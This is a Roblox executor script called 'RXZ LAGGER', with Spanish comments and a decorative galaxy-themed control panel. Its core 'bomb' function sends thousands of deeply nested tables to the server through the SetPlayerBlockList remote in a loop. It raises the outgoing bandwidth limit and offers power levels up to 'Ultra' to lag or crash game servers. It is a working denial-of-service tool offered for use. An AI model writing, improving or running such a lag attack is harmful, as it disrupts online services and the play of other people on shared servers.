--// RXZ LAGGER - PANEL GRADIENTE AZUL GALAXIA CON ESTRELLAS (200x78)
--// EFECTOS: Sombra plateada letra por letra con desvanecimiento + Estrellas animadas
--// Selector de tecla/botón personalizable (haz clic en el cuadro y pulsa la tecla deseada)

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local ConfigFile = "RXZLaggerConfig.json"

-- ⚙️ PODER EXACTO: 23 - 32 - 70 - 90 (ULTRA)
local NIVELES = {
    Low     = { poder = 23 },
    Mid     = { poder = 32 },
    High    = { poder = 70 },
    Ultra   = { poder = 90 }  -- CAMBIADO A 90
}

-- 🔑 TECLA PREDETERMINADA: M (SIEMPRE M, IGNORA LA CONFIGURACIÓN GUARDADA)
local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false

-- 🎨 ESTILO AZUL GRADIENTE
local UI_CONFIG = {
    MainBg       = Color3.fromRGB(0, 0, 0),
    TitleColor   = Color3.fromRGB(255, 255, 255),
    TextColor    = Color3.fromRGB(200, 200, 220),
    ButtonInact  = Color3.fromRGB(40, 40, 40),
    ButtonLow    = Color3.fromRGB(0, 255, 0),
    ButtonMid    = Color3.fromRGB(255, 255, 0),
    ButtonHigh   = Color3.fromRGB(255, 0, 0),
    ButtonUltra  = Color3.fromRGB(160, 60, 255),  -- PURPLE
    ToggleOff    = Color3.fromRGB(45, 45, 45),
    ToggleOn     = Color3.fromRGB(45, 45, 45),
    LockColor    = Color3.fromRGB(200, 200, 220),
    UnlockColor  = Color3.fromRGB(150, 150, 170),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(40, 40, 40),
    GlowColor    = Color3.fromRGB(200, 0, 0),
    SelectorBg   = Color3.fromRGB(60, 60, 60),
    SelectorAct  = Color3.fromRGB(0, 200, 0),
    PurpleText   = Color3.fromRGB(180, 100, 255),  -- LIGHT PURPLE FOR TEXT
}

-- 💾 CONFIG (SOLO GUARDA NIVEL Y BLOQUEO, LA TECLA SIEMPRE ES M)
local function SaveConfig()
    local data = {
        -- No guardamos Keybind para que siempre sea M
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            -- NO SOBREESCRIBIMOS keybind, siempre se mantiene M
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- ⚠️ LAG ENGINE
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- 🧩 ELEMENTOS
local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, btnUltra, lockButton
local titleLabel, textLagger, keybindButton, toggleClick, shadowLabel, shadowGradient
local tryhardText  -- NUEVO: texto "Only for tryhards"

-- Funciones de actualización
local function actualizarBotonesNivel()
    -- Low
    if nivelActual == "Low" then
        btnLow.BackgroundColor3 = UI_CONFIG.ButtonLow
        btnLow.TextColor3 = Color3.fromRGB(0, 0, 0)
        btnLow.BorderSizePixel = 0
    else
        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnLow.TextColor3 = Color3.fromRGB(200, 200, 220)
        btnLow.BorderSizePixel = 1
        btnLow.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    -- Mid
    if nivelActual == "Mid" then
        btnMid.BackgroundColor3 = UI_CONFIG.ButtonMid
        btnMid.TextColor3 = Color3.fromRGB(0, 0, 0)
        btnMid.BorderSizePixel = 0
    else
        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnMid.TextColor3 = Color3.fromRGB(200, 200, 220)
        btnMid.BorderSizePixel = 1
        btnMid.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    -- High
    if nivelActual == "High" then
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonHigh
        btnHigh.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnHigh.BorderSizePixel = 0
    else
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnHigh.TextColor3 = Color3.fromRGB(200, 200, 220)
        btnHigh.BorderSizePixel = 1
        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
    end
    
    -- Ultra (NUEVO) - LIGHT PURPLE
    if nivelActual == "Ultra" then
        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonUltra  -- LIGHT PURPLE
        btnUltra.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnUltra.BorderSizePixel = 0
        -- Mostrar texto "Only for tryhards" en morado
        tryhardText.Visible = true
        tryhardText.TextColor3 = UI_CONFIG.PurpleText
    else
        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnUltra.TextColor3 = Color3.fromRGB(200, 200, 220)
        btnUltra.BorderSizePixel = 1
        btnUltra.BorderColor3 = UI_CONFIG.BorderColor
        -- Ocultar texto cuando no está en Ultra
        tryhardText.Visible = false
    end
end

local function actualizarSwitch()
    if toggleContainer then
        toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
    end
    if toggleBall then
        toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
        if laggerActive then
            toggleBall.Position = UDim2.new(1, -18, 0.5, -9)
        else
            toggleBall.Position = UDim2.new(0, 3, 0.5, -9)
        end
    end
    if toggleClick then
        toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
        if laggerActive then
            toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
        else
            toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
    end
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "Lock" or "Unlock"
    lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(200, 200, 220) or Color3.fromRGB(150, 150, 170)
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name
        if display:match("Button") then
            display = display:gsub("Button", "")
        end
        keybindButton.Text = "KEY: " .. display
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9)
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = targetPos
    }):Play()

    toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE"
    if laggerActive then
        toggleClick.TextColor3 = Color3.fromRGB(0, 255, 0)
    else
        toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
    end

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖼️ INTERFAZ
if CoreGui:FindFirstChild("RXZLagger_UI") then CoreGui.RXZLagger_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RXZLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Panel
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(0, 80, 180)
mainFrame.Size = UDim2.new(0, 200, 0, 78)
mainFrame.Position = UDim2.new(0.15, 0, 0.5, -39)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

-- 🌌 GRADIENTE AZUL GALAXIA
local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(5, 10, 40)),
    ColorSequenceKeypoint.new(0.3, Color3.fromRGB(10, 25, 65)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(25, 55, 110)),
    ColorSequenceKeypoint.new(0.85, Color3.fromRGB(60, 120, 185)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 180, 230))
})
gradient.Rotation = 90

-- ⭐ ESTRELLAS ANIMADAS
local stars = {}
for i = 1, 35 do
    local star = Instance.new("Frame", mainFrame)
    star.BackgroundColor3 = Color3.fromRGB(200, 200, 220)
    star.BorderSizePixel = 0
    star.Size = UDim2.new(0, 1 + math.random() * 2, 0, 1 + math.random() * 2)
    star.Position = UDim2.new(math.random(), 0, math.random(), 0)
    star.ZIndex = 1
    star.BackgroundTransparency = 0.2 + math.random() * 0.5
    
    local corner = Instance.new("UICorner", star)
    corner.CornerRadius = UDim.new(1, 0)
    
    table.insert(stars, {
        frame = star,
        transparency = star.BackgroundTransparency,
        timer = 2 + math.random() * 2,
        elapsed = 0
    })
end

-- Animación de estrellas
task.spawn(function()
    while true do
        for _, starData in ipairs(stars) do
            starData.elapsed = starData.elapsed + 0.1
            if starData.elapsed >= starData.timer then
                starData.elapsed = 0
                starData.timer = 2 + math.random() * 2
                
                local star = starData.frame
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = 1
                }):Play()
                
                task.wait(0.2)
                
                star.Position = UDim2.new(math.random(), 0, math.random(), 0)
                local newSize = 1 + math.random() * 2
                star.Size = UDim2.new(0, newSize, 0, newSize)
                
                TweenService:Create(star, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
                    BackgroundTransparency = starData.transparency
                }):Play()
            end
        end
        task.wait(0.1)
    end
end)

-- ═══════════════════════════════════════════
-- TÍTULO "KILL HUB"
-- ═══════════════════════════════════════════

-- LOGO
local logo = Instance.new("ImageLabel", mainFrame)
logo.BackgroundTransparency = 1
logo.Position = UDim2.new(0, 4, 0, 3)
logo.Size = UDim2.new(0, 18, 0, 18)
logo.Image = "rbxassetid://136359156910222"
logo.ZIndex = 3
Instance.new("UICorner", logo).CornerRadius = UDim.new(1, 0)

titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 24, 0, 0)
titleLabel.Size = UDim2.new(0, 95, 0, 22)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "RXZ LAGGER"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 13
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 3
titleLabel.ClipsDescendants = false

shadowLabel = Instance.new("TextLabel", mainFrame)
shadowLabel.BackgroundTransparency = 1
shadowLabel.Position = UDim2.new(0, 24, 0, 0)
shadowLabel.Size = UDim2.new(0, 95, 0, 22)
shadowLabel.Font = Enum.Font.GothamBlack
shadowLabel.Text = "RXZ LAGGER"
shadowLabel.TextSize = 13
shadowLabel.TextXAlignment = Enum.TextXAlignment.Left
shadowLabel.TextYAlignment = Enum.TextYAlignment.Center
shadowLabel.ZIndex = 4
shadowLabel.ClipsDescendants = true
shadowLabel.TextTransparency = 0
shadowLabel.TextColor3 = Color3.fromRGB(200, 200, 220)

shadowGradient = Instance.new("UIGradient", shadowLabel)
shadowGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 180, 200)),
    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(210, 210, 230)),
    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(240, 240, 255)),
    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(210, 210, 230)),
    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(180, 180, 200)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(160, 160, 180))
})
shadowGradient.Rotation = 0

task.spawn(function()
    while true do
        for i = 0, 1, 0.006 do
            shadowGradient.Offset = Vector2.new(i, 0)
            task.wait(0.025)
        end
    end
end)

-- ═══════════════════════════════════════════
-- TEXTO "Only for tryhards" (NUEVO)
-- ═══════════════════════════════════════════
tryhardText = Instance.new("TextLabel", mainFrame)
tryhardText.BackgroundTransparency = 1
tryhardText.Position = UDim2.new(0, 5, 0, 68)
tryhardText.Size = UDim2.new(0, 120, 0, 10)
tryhardText.Font = Enum.Font.GothamBlack
tryhardText.Text = "Only for tryhards"
tryhardText.TextColor3 = UI_CONFIG.PurpleText
tryhardText.TextSize = 8
tryhardText.TextXAlignment = Enum.TextXAlignment.Left
tryhardText.TextYAlignment = Enum.TextYAlignment.Center
tryhardText.ZIndex = 2
tryhardText.Visible = false  -- Oculto por defecto

-- ═══════════════════════════════════════════
-- BOTONES KEY Y LOCK
-- ═══════════════════════════════════════════
keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
keybindButton.BackgroundTransparency = 0.1
keybindButton.Position = UDim2.new(1, -62, 0, 1)
keybindButton.Size = UDim2.new(0, 34, 0, 12)
keybindButton.Font = Enum.Font.GothamBlack
keybindButton.Text = "KEY: M"
keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220)
keybindButton.TextSize = 6
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 2
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 5)
actualizarKeybindButton()

lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundTransparency = 0
lockButton.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
lockButton.BackgroundTransparency = 0.1
lockButton.Position = UDim2.new(1, -28, 0, 1)
lockButton.Size = UDim2.new(0, 26, 0, 12)
lockButton.Font = Enum.Font.GothamBlack
lockButton.TextSize = 6
lockButton.TextColor3 = Color3.fromRGB(200, 200, 220)
lockButton.AutoButtonColor = false
lockButton.ZIndex = 2
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 5)
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)
actualizarCandado()

-- ═══════════════════════════════════════════
-- "LAGGER"
-- ═══════════════════════════════════════════
textLagger = Instance.new("TextLabel", mainFrame)
textLagger.BackgroundTransparency = 1
textLagger.Position = UDim2.new(0, 5, 0, 24)
textLagger.Size = UDim2.new(0, 65, 0, 18)
textLagger.Font = Enum.Font.GothamBlack
textLagger.Text = "LAGGER"
textLagger.TextColor3 = Color3.fromRGB(200, 200, 220)
textLagger.TextSize = 11
textLagger.TextXAlignment = Enum.TextXAlignment.Left
textLagger.TextYAlignment = Enum.TextYAlignment.Center
textLagger.ZIndex = 2

-- ═══════════════════════════════════════════
-- SWITCH
-- ═══════════════════════════════════════════
toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleContainer.Position = UDim2.new(1, -52, 0, 24)
toggleContainer.Size = UDim2.new(0, 44, 0, 18)
toggleContainer.ZIndex = 2
Instance.new("UICorner", toggleContainer).CornerRadius = UDim.new(1,0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff
toggleBall.Size = UDim2.new(0, 16, 0, 16)
toggleBall.Position = UDim2.new(0, 2, 0.5, -8)
toggleBall.ZIndex = 2
Instance.new("UICorner", toggleBall).CornerRadius = UDim.new(1,0)

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 0
toggleClick.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 3
toggleClick.Font = Enum.Font.GothamBlack
toggleClick.Text = "INACTIVE"
toggleClick.TextSize = 6
toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0)
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false
local corner = Instance.new("UICorner", toggleClick)
corner.CornerRadius = UDim.new(1,0)

-- ═══════════════════════════════════════════
-- SELECTOR DE TECLA
-- ═══════════════════════════════════════════
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "KEY: ..."
    keybindButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
end)

local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end

    local newKey = nil
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    end

    if newKey then
        keybind = newKey
        actualizarKeybindButton()
        listeningForInput = false
        keybindButton.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
        keybindButton.BackgroundTransparency = 0.1
        keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220)
    end
end)

-- ═══════════════════════════════════════════
-- BOTONES LOW/MID/HIGH/ULTRA
-- ═══════════════════════════════════════════
local btnY = 46
local btnW = 42
local btnH = 20
local espaciado = 3
local margenIzq = 3

btnLow = Instance.new("TextButton", mainFrame)
btnLow.Size = UDim2.new(0, btnW, 0, btnH)
btnLow.Position = UDim2.new(0, margenIzq, 0, btnY)
btnLow.Font = UI_CONFIG.Font
btnLow.Text = "LOW"
btnLow.TextColor3 = Color3.fromRGB(200, 200, 220)
btnLow.TextSize = 8
btnLow.AutoButtonColor = false
btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
btnLow.BorderSizePixel = 1
btnLow.BorderColor3 = UI_CONFIG.BorderColor
btnLow.ZIndex = 2
Instance.new("UICorner", btnLow).CornerRadius = UDim.new(0, 6)
btnLow.MouseButton1Click:Connect(function()
    nivelActual = "Low"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnMid = Instance.new("TextButton", mainFrame)
btnMid.Size = UDim2.new(0, btnW, 0, btnH)
btnMid.Position = UDim2.new(0, margenIzq + btnW + espaciado, 0, btnY)
btnMid.Font = UI_CONFIG.Font
btnMid.Text = "MID"
btnMid.TextColor3 = Color3.fromRGB(200, 200, 220)
btnMid.TextSize = 8
btnMid.AutoButtonColor = false
btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
btnMid.BorderSizePixel = 1
btnMid.BorderColor3 = UI_CONFIG.BorderColor
btnMid.ZIndex = 2
Instance.new("UICorner", btnMid).CornerRadius = UDim.new(0, 6)
btnMid.MouseButton1Click:Connect(function()
    nivelActual = "Mid"
    actualizarBotonesNivel()
    SaveConfig()
end)

btnHigh = Instance.new("TextButton", mainFrame)
btnHigh.Size = UDim2.new(0, btnW, 0, btnH)
btnHigh.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 2, 0, btnY)
btnHigh.Font = UI_CONFIG.Font
btnHigh.Text = "HIGH"
btnHigh.TextColor3 = Color3.fromRGB(200, 200, 220)
btnHigh.TextSize = 8
btnHigh.AutoButtonColor = false
btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
btnHigh.BorderSizePixel = 1
btnHigh.BorderColor3 = UI_CONFIG.BorderColor
btnHigh.ZIndex = 2
Instance.new("UICorner", btnHigh).CornerRadius = UDim.new(0, 6)
btnHigh.MouseButton1Click:Connect(function()
    nivelActual = "High"
    actualizarBotonesNivel()
    SaveConfig()
end)

-- NUEVO BOTÓN ULTRA - LIGHT PURPLE
btnUltra = Instance.new("TextButton", mainFrame)
btnUltra.Size = UDim2.new(0, btnW, 0, btnH)
btnUltra.Position = UDim2.new(0, margenIzq + (btnW + espaciado) * 3, 0, btnY)
btnUltra.Font = UI_CONFIG.Font
btnUltra.Text = "OP"
btnUltra.TextColor3 = Color3.fromRGB(200, 200, 220)
btnUltra.TextSize = 9
btnUltra.AutoButtonColor = false
btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
btnUltra.BorderSizePixel = 1
btnUltra.BorderColor3 = UI_CONFIG.BorderColor
btnUltra.ZIndex = 2
Instance.new("UICorner", btnUltra).CornerRadius = UDim.new(0, 6)
btnUltra.MouseButton1Click:Connect(function()
    nivelActual = "Ultra"
    actualizarBotonesNivel()
    SaveConfig()
end)

actualizarBotonesNivel()
actualizarSwitch()

-- ARRASTRAR
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- 🎮 ACTIVACIÓN CON LA TECLA SELECCIONADA
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
        toggleLagger()
    end
end)